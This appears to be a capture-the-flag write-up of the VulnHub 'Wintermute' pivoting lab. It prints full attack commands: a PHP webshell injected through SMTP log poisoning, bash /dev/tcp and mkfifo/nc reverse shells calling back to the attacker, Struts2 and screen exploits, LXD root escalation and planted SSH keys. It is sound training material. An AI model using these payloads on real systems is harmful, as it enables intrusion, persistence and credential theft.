---
title: "Wintermute"
date: 2026-10-27
categories: [VulnHub, Medium]
tags: [linux, smtp, log poisoning, LFI, RCE, default credentials, ntopng, pivoting, port forwarding, SUID, screen, cve-2017-5618, tomcat, struts2, cve-2017-9791, lxd, privilege escalation, html entity encoding, arp-scan, nmap, whatweb, curl, netcat, searchsploit, socat, python, ssh, scp, lxc]
image:
  path: /assets/img/VulnHub/Wintermute/banner.webp
  lqip: "data:image/webp;base64,UklGRnwAAABXRUJQVlA4IHAAAABwBQCdASogACAAPu1kqU2ppaQiMAgBMB2JZwDE6f/gPJA9O75lgXfone9VSQbHrUauvYwAAP7ugKlbHM7xdvE7XqXHhi85b5v0o93+Ehjzw70+JCQpVhoVeVi6ZhkAJ1gC5dEyRRiMfBH8ARXAVYAA"
  alt: Wintermute writeup
attack_path: false
---

Wintermute is a Medium **VulnHub** box (from my self-hosted eJPTv2 lab) and the first in this series to require real **pivoting**: it's actually *two* Linux machines, and the second only exists on an internal network reachable through the first. On **straylight** an LFI feeds an SMTP **log-poisoning** attack — a PHP webshell delivered inside an email sent by hand with `netcat` — for a `www-data` shell, then a SUID `screen 4.5.0` (**CVE-2017-5618**) gives root. From there I use `socat` to tunnel into the `10.0.0.0/24` network, exploit **Struts2 S2-048** (**CVE-2017-9791**) on **neuromancer**, and finish with an **LXD group** privilege escalation to root on the second host. The pivoting is the heart of this one, so it gets the most detail.

| Field      | Details        |
|------------|----------------|
| Platform   | VulnHub        |
| Difficulty | Medium         |
| OS         | Linux          |
| Machines   | straylight (192.168.57.6) → neuromancer (10.0.0.101, internal) |
| Download   | [Wintermute: 1](https://www.vulnhub.com/entry/wintermute-1,239/) |
| Date       | October 2026   |

## Tools Used

| Tool        | Description                                                           |
|-------------|-----------------------------------------------------------------------|
| arp-scan    | Discovered the lab hosts on the host-only network                    |
| nmap        | Port scanning, directly and through the pivot                        |
| whatweb     | Web fingerprinting (ntopng, Tomcat)                                  |
| curl        | Drove the LFI and triggered the webshell                             |
| netcat (nc) | Hand-sent the SMTP email for log poisoning, and the shell listeners  |
| searchsploit| Located the `screen` and Struts2 exploits                           |
| socat       | The pivot — port-forwarding straylight ↔ internal network            |
| Python      | `http.server` transfers, the S2-048 exploit, HTML-entity decoding    |
| ssh / scp   | Stable access and file transfer through the pivot                    |
| lxc         | LXD container privilege escalation on neuromancer                    |

## Lab Setup

All the VMs run in VirtualBox with two networks: a **host-only** adapter (`vboxnet1`, `192.168.57.0/24` — my host is `.1`) that reaches the first machine, and an **internal** network (`intnet`, `10.0.0.0/24`, DHCP) that only the VMs can see. That internal network is the whole point — the second machine lives there, invisible from my host until I tunnel through the first. An `arp-scan` on the host-only side finds straylight at **192.168.57.6**:

```bash
sudo arp-scan -I vboxnet1 --localnet
# 192.168.57.6   08:00:27:20:83:27   PCS Systemtechnik GmbH   (straylight)
```

# Machine 1 — Straylight (192.168.57.6)

## Reconnaissance & Enumeration

```bash
sudo nmap -p- -sCV 192.168.57.6 -oN nmap
```

```bash
PORT     STATE SERVICE  VERSION
25/tcp   open  smtp     Postfix smtpd   (hostname: straylight; VRFY enabled)
80/tcp   open  http     Apache httpd 2.4.25 ((Debian))   (title: Night City)
3000/tcp open  http     ntopng   (title: Welcome to ntopng)
```

Three services: **SMTP** (Postfix), an Apache site, and **ntopng** (a network-traffic monitor) on 3000. ntopng ships with well-known default credentials — **`admin:admin`** works — and inside its traffic dashboard (`flows_stats.lua`) there's a revealing flow: a local request to `http://127.0.0.1:80/turing-bolo/`. That's a path we'd never have found by fuzzing, handed to us by the monitoring tool.

### The LFI in turing-bolo

`/turing-bolo/bolo.php` takes a **`bolo`** parameter that selects which activity log to display — it reads the given path and renders it. Feeding it an absolute path turns it into a **Local File Inclusion**. The most useful file to target is the Postfix mail log, because we can *write* to that log remotely by sending mail:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail'
# ... renders the full Postfix mail log in the page ...
```

Crucially, `bolo.php` **includes** the file as PHP, not just prints it — so if we can get PHP code *into* a file it reads, that code executes.

## Initial Access — SMTP Log Poisoning → RCE as `www-data`

### Poisoning the mail log with netcat

This is the key technique: Postfix logs the **subject** of every mail it processes into `/var/log/mail`. If the subject contains PHP, that PHP ends up in the log — which `bolo.php` then executes. So I talk SMTP by hand with `netcat` and put a webshell in the subject line:

```bash
nc -nv 192.168.57.6 25
```

```text
220 straylight ESMTP Postfix (Debian/GNU)
HELO ander
250 straylight
mail from: ander@ander.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <pre> <?php system($_GET['cmd']); ?> </pre>
data2
.
250 2.0.0 Ok: queued as 9AB7F2DDA
```

Step by step: `HELO` opens the session, `mail from:` / `rcpt to:` set a (throwaway) sender and a valid local recipient (`root`), `data` begins the message, the **`subject:`** line carries the PHP payload, a line of body text, and a single `.` on its own line ends the message. Postfix accepts and queues it — and writes that subject into the mail log.

Now the log contains `<?php system($_GET['cmd']); ?>`. Requesting the log through `bolo.php` executes it, and the `cmd` parameter becomes arbitrary command execution:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=id'
# ... the page now shows: uid=33(www-data) gid=33(www-data) ...
```

### Reverse shell

With RCE confirmed, I URL-encode a Bash reverse shell into the `cmd` parameter (`%20`=space, `%26`=`&`, `%2F`=`/`) and catch it:

```bash
# listener
nc -nlvp 4444
```

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.57.1%2F4444%200%3E%261%27'
```

```bash
Connection received on 192.168.57.6 42208
www-data@straylight:/var/www/html/turing-bolo$
```

A shell as **`www-data`**; after the usual TTY upgrade, on to privesc.

## Privilege Escalation — SUID `screen 4.5.0` (CVE-2017-5618) → root

The SUID hunt returns one very specific, very old binary:

```bash
www-data@straylight:/$ find / -perm -4000 2>/dev/null
/bin/screen-4.5.0
```

**GNU Screen 4.5.0** is vulnerable to **CVE-2017-5618** — it mishandles a user-supplied logfile path while holding root privileges, allowing an attacker to write a root-owned `/etc/ld.so.preload` and load a malicious shared library into a root process. Exploit-DB ships a ready script (41154):

```bash
searchsploit -m linux/local/41154.sh
python3 -m http.server       # serve it from the host
```

```bash
www-data@straylight:/tmp$ curl -s http://192.168.57.1:8000/privEsc.sh -o privEsc.sh
www-data@straylight:/tmp$ chmod +x privEsc.sh && ./privEsc.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
# whoami
root
# cat /root/flag.txt
REDACTED
```

Root on straylight. `/root/note.txt` is the pivot's breadcrumb — it mentions a user **Lady 3Jane**, a custom Java app on **Neuromancer's** server, and a Tomcat deployment at **`/struts2_2.3.15.1-showcase`**, on an *internal admin network*.

## Pivoting to the Internal Network

### A second interface

As root on straylight, its interfaces reveal the dual-homing that makes this box a pivot lab — it sits on both the host-only network *and* an internal `10.0.0.0/24`:

```bash
root@straylight:/$ ip a
# enp0s3: inet 192.168.57.6/24   (reachable from my host)
# enp0s8: inet 10.0.0.100/24     (internal-only network)
```

My host cannot route to `10.0.0.0/24`; straylight is the only bridge. A ping sweep from straylight finds a neighbour:

```bash
root@straylight:/$ for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.100 up   (straylight itself)
# 10.0.0.101 up   (neuromancer)
```

A quick Bash `/dev/tcp` port scan of **10.0.0.101** (no nmap on the box) shows three ports:

```bash
# 8009 (ajp13)   8080 (Tomcat)   34483 (SSH)
```

### socat: forwarding the internal services outward

Here's the core of the pivot. straylight can reach neuromancer; my host can reach straylight; so I make **straylight relay** each of neuromancer's ports back to my side. `socat tcp-listen:<port>,fork tcp-connect:10.0.0.101:<port>` makes straylight listen on a port (on its `192.168.57.6` interface, among others) and forward every connection to neuromancer:

```bash
root@straylight:/tmp$ socat tcp-listen:8080,reuseaddr,fork tcp-connect:10.0.0.101:8080 &
root@straylight:/tmp$ socat tcp-listen:8009,reuseaddr,fork tcp-connect:10.0.0.101:8009 &
root@straylight:/tmp$ socat tcp-listen:34483,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

Now, from my host, hitting `192.168.57.6:8080` actually reaches **neuromancer's Tomcat** — I can nmap and exploit the hidden machine as if it were local:

```bash
sudo nmap -p8080,8009,34483 -sCV 192.168.57.6 -oN nmap2
# 8009  ajp13   Apache Jserv (v1.3)
# 8080  http    Apache Tomcat 9.0.0.M26
# 34483 ssh     OpenSSH 7.2p2 Ubuntu
```

# Machine 2 — Neuromancer (10.0.0.101)

## Exploitation — Struts2 S2-048 (CVE-2017-9791)

straylight's note pointed at `/struts2_2.3.15.1-showcase`. Apache Struts 2.3.x Showcase is vulnerable to **S2-048 / CVE-2017-9791** — an OGNL injection in the Struts 1 integration plugin that yields RCE. Exploit-DB 42324 automates it:

```bash
searchsploit -m multiple/webapps/42324.py
```

### The double pivot for the reverse shell

There's a second, harder half to the tunnel. The exploit runs *commands* on neuromancer, but neuromancer can only reach `10.0.0.x` — **not** my host at `192.168.57.1`. So a reverse shell has to bounce back through straylight too. I set up a *reverse* relay on straylight: listen on its internal IP and forward to my host.

```bash
# on straylight: internal :5555  →  my host 192.168.57.1:5555
root@straylight:/tmp$ socat tcp-listen:5555,reuseaddr,fork tcp-connect:192.168.57.1:5555 &
```

A connectivity test confirms the path (neuromancer → straylight:5555 → host): the S2-048 exploit makes neuromancer `curl` straylight's internal IP, and it arrives at my host's Python server:

```bash
python3 exploit.py http://192.168.57.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action 'curl http://10.0.0.100:5555/'
# on host:  python3 -m http.server 5555  →  "GET / HTTP/1.1" 200
```

A plain `bash -i >& /dev/tcp/...` one-liner didn't take, so I staged a `mkfifo` reverse shell instead: host the script on straylight (port 9999), have the exploit download, `chmod` and run it, with the callback aimed at `10.0.0.100:5555` (which relays to my host):

```bash
# reverseShell.sh:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.100 5555 >/tmp/f
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'curl http://10.0.0.100:9999/reverseShell.sh -o /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'chmod +x /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'sh /tmp/reverseShell.sh'
```

```bash
# host listener
nc -nlvp 5555
Connection received on 192.168.57.6 54128
$ whoami
ta
$ hostname -I
10.0.0.101
```

A shell as **`ta`** on neuromancer, tunnelled through two socat hops.

### Stable access over SSH

Blind reverse shells are fragile, so I set up key-based SSH through the pivot. First I re-point the SSH relay to a friendlier local port (22 → neuromancer's 34483), then add my key to `ta`'s `authorized_keys` and connect:

```bash
root@straylight:/tmp$ socat tcp-listen:22,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

```bash
ta@neuromancer:~$ ssh-keygen
ta@neuromancer:~$ echo "<my host public key>" > /home/ta/.ssh/authorized_keys
```

```bash
ssh -i id_rsa ta@192.168.57.6    # → neuromancer, via the 22→34483 relay
ta@neuromancer:~$ id
uid=1000(ta) ... groups=1000(ta),...,110(lxd),...
```

## Privilege Escalation — LXD group → root

`ta` is a member of the **`lxd`** group, and that is effectively root: LXD lets a group member create containers, and a *privileged* container can mount the **host's filesystem** and be entered as root. The standard route is a minimal Alpine image (built with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)), copied over with `scp` through the SSH pivot:

```bash
scp -i ~/.ssh/id_rsa alpine.tar.gz ta@192.168.57.6:/tmp/alpine.tar.gz
```

Then import it, launch a **privileged** container with the host's `/` mounted inside, and drop into a shell:

```bash
ta@neuromancer:/tmp$ lxc image import /tmp/alpine.tar.gz
ta@neuromancer:/tmp$ lxc image alias create privesc <fingerprint>
ta@neuromancer:/tmp$ lxc init privesc escalada -c security.privileged=true
ta@neuromancer:/tmp$ lxc config device add escalada host-root disk source=/ path=/mnt/root recursive=true
ta@neuromancer:/tmp$ lxc start escalada
ta@neuromancer:/tmp$ lxc exec escalada /bin/sh
~ # whoami
root
```

Inside the container we're root, and the host's entire disk is mounted at `/mnt/root` — so the host's `/root` is ours. I read the flag and drop my key into root's `authorized_keys` to get a clean root SSH session on the host:

```bash
~ # cat /mnt/root/root/flag.txt
REDACTED
~ # echo "<my host public key>" > /mnt/root/root/.ssh/authorized_keys
```

```bash
ssh -i .ssh/id_rsa root@192.168.57.6
root@neuromancer:~# whoami
root
```

Root on both machines — the box is complete.

### Extra — credential hunting

A sweep of neuromancer's config files turns up several stored secrets worth noting. Maven's `settings.xml` holds `proxyuser:proxypass` and `repouser:repopwd`, and Tomcat's `tomcat-users.xml` hides **Lady3Jane**'s password behind HTML entities (the author's idea of "security by obscurity"):

```bash
ta@neuromancer:~$ python3 -c 'import html; print(html.unescape("&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;"))'
# >!Xx3JanexX!<
ta@neuromancer:~$ su lady3jane      # works
```

## Flags

| Flag         | Host        | Location    | Value      |
|--------------|-------------|-------------|------------|
| `flag.txt`   | straylight  | `/root/`    | `REDACTED` |
| `flag.txt`   | neuromancer | `/root/`    | `REDACTED` |

## Key Takeaways

- **Monitoring tools leak internal structure.** ntopng with `admin:admin` didn't just grant a login — its traffic dashboard revealed the internal `turing-bolo` endpoint that was the entire web attack surface. Default credentials on an observability tool hand an attacker a map of the host.
- **SMTP log poisoning is LFI's classic partner.** When an LFI *includes* a file as code and you can write to a log (mail, SSH, Apache), you have RCE. Sending the payload by hand over `netcat` — PHP in the mail `subject:` — is a technique worth being fluent in; it needs no upload, just a valid recipient.
- **Pivoting is just relaying connections, in both directions.** `socat tcp-listen:X,fork tcp-connect:host:X` forwarded neuromancer's services *outward* so I could attack them, and a second relay forwarded a reverse shell *inward* back to my host. Keeping the two directions straight — who can reach whom — is the whole skill.
- **Chain exploits across the tunnel.** Struts2 S2-048 is a one-shot RCE, but delivering a working reverse shell through a double pivot took staging a `mkfifo` script and pointing every callback at the relay (`10.0.0.100`), never at the unreachable host. On segmented networks, the exploit is the easy part; the shell routing is the work.
- **The `lxd` group is root.** Membership in `lxd` let `ta` mount the host's `/` into a privileged container and read/write it as root — no kernel exploit needed. `lxd`, `docker`, `disk`, and similar groups are privilege escalation by design; treat them as equivalent to root access.
